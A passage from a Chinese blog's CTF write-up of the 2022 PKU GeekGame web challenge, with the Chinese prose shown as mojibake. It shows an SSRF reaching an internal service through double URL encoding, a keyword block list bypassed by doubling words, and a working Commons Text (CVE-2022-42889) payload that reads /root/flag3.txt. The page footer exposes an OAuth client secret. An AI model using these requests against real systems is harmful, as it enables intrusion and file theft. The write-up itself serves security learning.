            index <span class="token operator">=</span> <span class="token class-name">URLDecoder</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>queryBean<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            queryBean<span class="token punctuation">.</span><span class="token function">setType</span><span class="token punctuation">(</span><span class="token string">"PKU"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>typeList<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>queryBean<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            typeList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>queryBean<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token class-name">Mono</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> str <span class="token operator">=</span> webClient<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">uri</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token class-name">HttpHeaders</span><span class="token punctuation">.</span>AUTHORIZATION<span class="token punctuation">,</span> auth<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token class-name">BodyInserters</span><span class="token punctuation">.</span><span class="token function">fromFormData</span><span class="token punctuation">(</span><span class="token string">"type"</span><span class="token punctuation">,</span> queryBean<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">retrieve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bodyToMono</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> queryBean<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">block</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™é‡Œåº”è¯¥æ˜¯ä¸ª SSRFï¼Œè¿™éƒ¨åˆ†åº”è¯¥è¦è®¿é—®æœ¬æœºä¸Šçš„ bonus æœåŠ¡æ¥æ‹¿ flag</p>
<p><code>index</code> å‚æ•°è¿™é‡Œå°†ç½‘å€äºŒæ¬¡ URL ç¼–ç å°±å¥½äº†</p>
<p>æ ¹æ®æ‰€ç»™çš„æºç  <code>Dockerfile</code></p>
<pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> openjdk:8u342-jre</span>
<span class="token instruction"><span class="token keyword">ENV</span> LANG C.UTF-8</span>
<span class="token instruction"><span class="token keyword">VOLUME</span> /tmp</span>
<span class="token instruction"><span class="token keyword">COPY</span> PKU_GeekGame_Ant_Web-1.0.0-SNAPSHOT.jar web.jar</span>
<span class="token instruction"><span class="token keyword">COPY</span> PKU_GeekGame_Ant_Backend-1.0.0-SNAPSHOT.jar backend.jar</span>
<span class="token instruction"><span class="token keyword">COPY</span> PKU_GeekGame_Ant_Bonus-1.0.0-SNAPSHOT.jar bonus.jar</span>
<span class="token instruction"><span class="token keyword">COPY</span> flag1.txt /root/flag1.txt</span>
<span class="token instruction"><span class="token keyword">COPY</span> flag2.txt /root/flag2.txt</span>
<span class="token instruction"><span class="token keyword">COPY</span> flag3.txt /root/flag3.txt</span>

<span class="token instruction"><span class="token keyword">RUN</span> echo <span class="token operator">\</span>
<span class="token string">"#!/bin/sh\n"</span><span class="token operator">\</span>
<span class="token string">"nohup java -jar /backend.jar --server.port=8079 &amp;\n"</span><span class="token operator">\</span>
<span class="token string">"nohup java -jar /bonus.jar --server.port=8080 &amp;"</span><span class="token operator">\</span>
&gt;&gt; /start.sh</span>
<span class="token instruction"><span class="token keyword">RUN</span> chmod +x /start.sh</span>
<span class="token instruction"><span class="token keyword">CMD</span> nohup sh -c <span class="token string">"/start.sh &amp;&amp; java -jar /web.jar --server.port=80"</span></span>
<span class="token instruction"><span class="token keyword">EXPOSE</span> 80</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>bonus å¼€åœ¨ 8080 ç«¯å£ï¼Œäºæ˜¯æ„é€ </p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/admin/http%253A%252F%252Flocalhost%253A8080%252F/</span> <span class="token http-version property">HTTP/1.1</span></span>

Response

Endpoints:
/bonus
/source_bak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124170141981.png"></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">POST /admin/http%253A%252F%252Flocalhost%253A8080%252Fbonus/ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124170213828.png" alt="bonus"></p>
<h4 id="æ‰“é€šæ•´ä¸ªç³»ç»Ÿ"><a href="#æ‰“é€šæ•´ä¸ªç³»ç»Ÿ" class="headerlink" title="æ‰“é€šæ•´ä¸ªç³»ç»Ÿ"></a>æ‰“é€šæ•´ä¸ªç³»ç»Ÿ</h4><blockquote>
<p><strong>ç¬¬äºŒé˜¶æ®µæç¤ºï¼š</strong></p>
<ul>
<li>Flag 1ï¼šå¾ˆå¤š HTTP æ¡†æ¶éƒ½ä¼šåœ¨åˆ¤æ–­ç½‘å€å¯¹åº”çš„ Endpoint æ—¶å»é™¤ç½‘å€ç»“å°¾çš„æ–œæ ã€‚</li>
<li>Flag 2ï¼šå¯ä»¥é€šè¿‡ web æœåŠ¡è®¿é—®æœ¬æœºçš„ bonus æœåŠ¡ï¼Œä»¥åŠåˆ«å¿˜äº†æºç æ˜¯å¯ä»¥ä¸‹è½½çš„ã€‚</li>
<li>Flag 3ï¼šâ€œè¿™ç¡®å®ä¸æ˜¯æ¼æ´ï¼Œè¿™æ˜¯ç‰¹æ€§â€ â€”â€” Log4j å¯¹ä»–çš„å¥½å…„å¼Ÿ Commons Text ç‚¹äº†ä¸€ä¸ªèµã€‚</li>
</ul>
</blockquote>
<p>è¿™éƒ¨åˆ†éœ€è¦ é€šè¿‡ bonus æœåŠ¡åœ¨æœºå™¨ä¸Šæ‰§è¡Œå‘½ä»¤</p>
<p>å†å»çœ‹æºç </p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">POST /admin/http%253A%252F%252Flocalhost%253A8080%252Fsource_bak/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">StringSubstitutor</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RestController</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BonusController</span> <span class="token punctuation">{</span>

	<span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/bonus"</span><span class="token punctuation">)</span>
	<span class="token keyword">public</span> <span class="token class-name">QueryBean</span> <span class="token function">bonus</span><span class="token punctuation">(</span><span class="token class-name">QueryBean</span> queryBean<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	    <span class="token keyword">if</span><span class="token punctuation">(</span>queryBean<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"CommonsText"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	        <span class="token class-name">StringSubstitutor</span> interpolator <span class="token operator">=</span> <span class="token class-name">StringSubstitutor</span><span class="token punctuation">.</span><span class="token function">createInterpolator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	        interpolator<span class="token punctuation">.</span><span class="token function">setEnableSubstitutionInVariables</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	        <span class="token class-name">String</span> value <span class="token operator">=</span> <span class="token function">replaceUnSafeWord</span><span class="token punctuation">(</span>queryBean<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	        <span class="token class-name">String</span> resultValue <span class="token operator">=</span> interpolator<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
	        queryBean<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>resultValue<span class="token punctuation">)</span><span class="token punctuation">;</span>

	    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
	        <span class="token comment">// flag3è—åœ¨/root/flag3.txtç­‰å¾…ä½ å‘ç°</span>
	    <span class="token punctuation">}</span>

	    <span class="token keyword">return</span> queryBean<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">replaceUnSafeWord</span><span class="token punctuation">(</span><span class="token class-name">String</span> txt<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	    <span class="token class-name">String</span> resultTxt <span class="token operator">=</span> txt<span class="token punctuation">;</span>

	    <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> unsafeList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"java"</span><span class="token punctuation">,</span> <span class="token string">"js"</span><span class="token punctuation">,</span> <span class="token string">"script"</span><span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token string">"start"</span><span class="token punctuation">,</span> <span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"dns"</span><span class="token punctuation">,</span> <span class="token string">"groovy"</span><span class="token punctuation">,</span> <span class="token string">"bsh"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">"ognl"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	    <span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> iterator <span class="token operator">=</span> unsafeList<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	    <span class="token class-name">String</span> word<span class="token punctuation">;</span>
	    <span class="token class-name">String</span> replaceString<span class="token punctuation">;</span>
	    <span class="token keyword">while</span> <span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	        word <span class="token operator">=</span> iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	        replaceString <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
	        resultTxt <span class="token operator">=</span> resultTxt<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"(?i)"</span> <span class="token operator">+</span> word<span class="token punctuation">,</span> replaceString<span class="token punctuation">)</span><span class="token punctuation">;</span>
	    <span class="token punctuation">}</span>

	    <span class="token keyword">return</span> resultTxt<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™é‡Œçš„è¿‡æ»¤ç›´æ¥åŒå†™ç»•è¿‡å°±å®Œäº‹äº†ã€‚</p>
<p>å» GitHub æ‰¾äº†è€åŠå¤© <code>queryBean</code> ç±»ä¼¼çš„ä»£ç ï¼Œæ‰çŸ¥é“æ‚¨ä»¬ Java è¿™é‡Œæ˜¯æŠŠæ‰€æœ‰ query å‚æ•°éƒ½åšäº†ä¸ªç±»ï¼Œè·å–å¯¹åº”çš„å€¼éƒ½æœ‰ä¸€ä¸ª getxxx æ–¹æ³•ã€‚</p>
<p>äºæ˜¯ <code>queryBean.getType()</code> å®é™…ä¸Šå°±æ˜¯æ¥æ”¶ <code>?type=xxx</code> çš„å€¼ï¼Œè€Œ <code>queryBean.getValue()</code> å°±æ˜¯æ‹¿ <code>value=xxx</code> äº†</p>
<p>è€Œè¿™ä¸ªæ‰“ SSRF è¦æŠŠ POST å‚æ•°æ”¾åœ¨ body é‡Œï¼ˆè¯¦è§ä¸Šé¢çš„ <code>AdminController</code>ï¼‰</p>
<br>

<p>å†å›åˆ°é¢˜ç›®</p>
<p>æœäº†ä¸‹ Commons Text RCEï¼Œæœç„¶å°±æ˜¯ä»Šå¹´åæœˆä»½è¿˜ç®—æŒºæ–°é²œçš„æ´ï¼ˆæ€ä¹ˆé‚£æ—¶å€™æ²¡å’‹å…³æ³¨æï¼Ÿ</p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1973">æµ…è°ˆApache Commons Text RCE(CVE-2022-42889)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/cve-2022-42889/">text4shell CVE-2022-42889 poc</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bleepingcomputer.com/news/security/apache-commons-text-rce-flaw-keep-calm-and-patch-away/">Apache Commons Text RCE flaw â€” Keep calm and patch away</a></p>
<p><a target="_blank" rel="noopener" href="https://www.rapid7.com/blog/post/2022/10/17/cve-2022-42889-keep-calm-and-stop-saying-4shell/">CVE-2022-42889: Keep Calm and Stop Saying â€œ4Shellâ€</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/korteke/CVE-2022-42889-POC">CVE-2022-42889-POC</a>         </p>
<p>é¦–å…ˆè¯•è¯•èƒ½ä¸èƒ½çœ‹ç‰ˆæœ¬</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125064232594.png"></p>
<p>è¯•è¯•èƒ½ä¸èƒ½ RCEï¼Œçœ‹ä¸Šå»æ˜¯å·²ç»æ‰§è¡Œäº†ï¼Œè¿”å›äº†ä¸ªæ‰§è¡Œçš„ UNIXProcessï¼Œä½†æ˜¯æ²¡æœ‰å‘½ä»¤æ‰§è¡Œçš„å›æ˜¾ã€‚</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125065025407.png"></p>
<p>ä½†æ˜¯é¢˜ç›®ç¯å¢ƒä¸å‡ºç½‘ï¼Œæ²¡æ³•åå¼¹ shellï¼Œåç«¯æ˜¯ç”¨ jar éƒ¨ç½²çš„æ— æ³•å†™å…¥é™æ€æ–‡ä»¶ï¼Œå¤–å¸¦çš„è¯ä¹Ÿæ²¡æƒ³åˆ°å•¥å¥½æ–¹æ¡ˆã€‚</p>
<p>æœ€åï¼Œæ€»å¾—æ‰¾ä¸ªæ–¹æ³•è¯»æ–‡ä»¶äº†ï¼Œæ­£å¥½çœ‹åˆ°äº†è¿™ä¸ª</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125065830066.png"></p>
<p>äºæ˜¯æ„é€  payload</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/admin/http%253A%252F%252Flocalhost%253A8080%252Fbonus%253F/</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">prob08-hp8fbaeg.geekgame.pku.edu.cn</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">JSESSIONID=9DFC4E40600AB403B62117862E63EB8B</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">52</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>

type=CommonsText&amp;value=${file:utf-8:/root/flag3.txt}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221125065748802.png"></p>
<p>ç»ˆäºå‡ºäº†ï¼ï¼ï¼</p>
<p>éº»äº†ï¼Œè¿˜æ˜¯ä¸ä¼š Java å•Šï¼Œæ‚¨ä»¬å¤ªä¼šç©äº†ï¼ˆ</p>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231170326177.png"></p>
<p>åˆæ˜¯ä¸€å¹´åŒ—äº¬å¤§å­¦ä¿¡æ¯å®‰å…¨ç»¼åˆèƒ½åŠ›ç«èµ›ï¼</p>
<p>é¢˜ç›®æ¯”éš”å£ USTC Hackergame éš¾äº†ä¸å°‘ï¼Œæ„Ÿè§‰æ›´åƒçœŸæ­£çš„ CTF é¢˜äº†</p>
<p>ä¸è¿‡ä»Šå¹´äº‹æƒ…æ¯”è¾ƒå¤šï¼Œä¸å¤§æœ‰æ—¶é—´æ¥æ‰“äº†æï¼ŒåŸºæœ¬å°±çœ‹äº†ä¸¤ä¸‰ä¸ªæ™šä¸Š/å‡Œæ™¨ï¼Œè¿˜æ˜¯çœ‹åˆ° 24 æ—¥ä¸­åˆå¼€å§‹è¿›å…¥ç¬¬äºŒé˜¶æ®µåªèƒ½æ‹¿ 1/3 çš„åˆ†å€¼ï¼Œäºæ˜¯é‚£å¤©å‡Œæ™¨æ‰æ€¥å¿™ç„äº†ä¸‹é¢˜ç›®ï¼Œä½†èƒ½éšæ‰‹åšå‡ºæ¥çš„è¿˜ä¸å¤šï¼ŒæŒºå¤šè¦è€å¿ƒæ‰¾èµ„æ–™çœ‹æ–‡æ¡£å®¡æºç çš„â€¦â€¦</p>
<p>å†ä¸€çœ‹æ€ä¹ˆå‘¨å…­ä¸­åˆå°±ç»“æŸäº†ï¼Œäºæ˜¯åˆç„äº†ä¸‹é¢˜ç›®ï¼ŒåŸºæœ¬ä¸Šçœ‹é¢˜å†åˆ°åšå‡ºæ¥éƒ½åœ¨ç¬¬äºŒé˜¶æ®µäº†ï¼Œä¹Ÿæ²¡å•¥åˆ†äº†ï¼Œåªèƒ½å‹‰å¼ºä¸Šä¸ªæ¦œå•äº†</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231170349338.png"></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231170241675.png"></p>
<p>ç”±äºæ—¶é—´å…³ç³»å’±ä¸»è¦å°±ç„äº†ä¸‹ Misc å’Œ Web é¢˜ï¼Œå…¶ä»–é¢˜ç›®ä¹ŸæŒºæœ‰æ„æ€çš„ï¼Œå‡ºé¢˜æ°´å¹³è¿˜æ˜¯å¾ˆä¸é”™çš„ï¼Œä¸»åŠæ–¹çš„å¸ˆå‚…ä»¬éƒ½è¾›è‹¦äº†ã€‚</p>
<p>å’±å¼€äº†çš„é¢˜ç›®ä¹Ÿæœ‰å¥½å‡ é“è¢«å¡ä½çš„ï¼Œæœ¬æ¥æ¯”èµ›ç»“æŸçš„å‰ä¸€å¤©æ™šä¸Šè¿˜æƒ³æ¥ç€çœ‹çš„ï¼Œä½†æ˜¯ä¸­é€”æ—¥æœºå™¨å»äº†ï¼Œäºæ˜¯å°±æ‘¸äº†ï¼ˆï¼ˆ</p>
<p>è¯´æ¥ä»Šå¹´ GeekGame çš„æ¦œå•ä¸Šçœ‹åˆ°äº†ä¸å°‘æ–°é¢å­”ï¼Œå–µå–µè€äº†å•Šã€‚ã€‚æ‰“ä¸åŠ¨äº†ï¼Œèººäº†.gif</p>
<p>å°±è¿™æ ·å§ï¼Œè¿˜æ˜¯ä»¥å­¦ä¹ ä¸ºä¸».jpg</p>
<blockquote>
<p><strong>å®˜æ–¹é¢˜è§£ã€é¢˜ç›®é™„ä»¶å’Œæºç ç­‰èµ„æ–™å­˜æ¡£ï¼š</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/PKU-GeekGame/geekgame-2nd">https://github.com/PKU-GeekGame/geekgame-2nd</a></p>
</blockquote>
<p><em>ï¼ˆæºœäº†æºœäº†å–µ</em></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        æ–‡ç« ä½œè€…:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz" rel="external nofollow noreferrer">MiaoTony</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        æ–‡ç« é“¾æ¥:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz/2022/11/30/CTF_2022PKUGeekGame/">https://miaotony.xyz/2022/11/30/CTF_2022PKUGeekGame/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        ç‰ˆæƒå£°æ˜:
                    </i>
                </span>
                <span class="reprint-info">
                    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨
                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a>
                    è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº
                    <a href="https://miaotony.xyz" target="_blank">MiaoTony</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>å¤åˆ¶æˆåŠŸï¼Œè¯·éµå¾ªæœ¬æ–‡çš„è½¬è½½è§„åˆ™</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">æŸ¥çœ‹</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CTF/">
                                    <span class="chip bg-color">CTF</span>
                                </a>
                            
                                <a href="/tags/WriteUp/">
                                    <span class="chip bg-color">WriteUp</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>å¾®ä¿¡æ‰«ä¸€æ‰«å³å¯åˆ†äº«ï¼</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">èµ</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">æ‰“èµä¸€ä¸‹è®©æˆ‘æ¥ç‚¹å¥½åƒå¥½ç©çš„å‘—~</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <!-- 
                            <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">æ”¯ä»˜å®</a></li> 
                        -->
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">å¾® ä¿¡</a></li>
                    </ul>
                    <!-- 
                        <div id="alipay">
                        <img src="/" class="reward-img" alt="æ”¯ä»˜å®æ‰“èµäºŒç»´ç ">
                        </div> 
                -->
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="å¾®ä¿¡æ‰“èµäºŒç»´ç ">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    
        <link rel="stylesheet" href="/libs/gitalk/gitalk.min.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>è¯„è®º</span>
    </div>
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: '116343b4650fce4789b6',
        clientSecret: '3e9be2ad6c9b693af1753290c7c059b1e4f34d5d',
